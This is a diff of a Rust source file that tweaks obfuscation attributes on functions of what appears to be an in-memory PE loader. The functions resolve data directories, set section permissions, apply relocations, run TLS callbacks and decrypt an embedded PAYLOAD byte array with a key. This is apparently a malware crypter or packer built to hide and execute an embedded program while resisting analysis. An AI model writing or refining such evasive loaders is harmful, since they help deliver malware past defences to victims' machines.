@@ -114,7 +114,7 @@ const PAYLOAD: &[u8] = &[
 ];
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, control_f = true)]
+#[obfuscate(garbage = true, len = 12)]
 unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const ImageDataDirectory {
     let optional_header_ptr = &(*nt_headers).optional_header as *const ImageOptionalHeader64;
     let data_dir_ptr = (optional_header_ptr as usize + mem::offset_of!(ImageOptionalHeader64, number_of_rva_and_sizes) + mem::size_of::<u32>()) as *const ImageDataDirectory;
@@ -122,7 +122,7 @@ unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) 
 }
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, control_f = true)]
+#[obfuscate(garbage = true, len = 12)]
 unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHeader) -> Result<(), String> {
     let characteristics = section.characteristics;
     let mut protect = PAGE_READONLY;
@@ -154,7 +154,7 @@ unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHea
 }
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, control_f = true)]
+#[obfuscate(garbage = true, len = 12)]
 unsafe fn process_relocations(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
     let reloc_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_BASERELOC);
     if (*reloc_dir).virtual_address == 0 {
@@ -231,7 +231,7 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
 }
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, control_f = true)]
+#[obfuscate(garbage = true, len = 12, control_f = true)]
 unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
     let tls_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_TLS);
     if (*tls_dir).virtual_address == 0 {
@@ -252,7 +252,7 @@ unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtH
 }
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, control_f = true)]
+#[obfuscate(garbage = true, len = 12, control_f = true)]
 unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
     let section_header_ptr = (nt_headers as *const ImageNtHeaders64 as usize
         + mem::size_of::<u32>()
@@ -353,7 +353,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
 }
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, control_f = true)]
+#[obfuscate(garbage = true, control_f = true, len = 20)]
 fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
     if key.is_empty() {
         return data.to_vec();
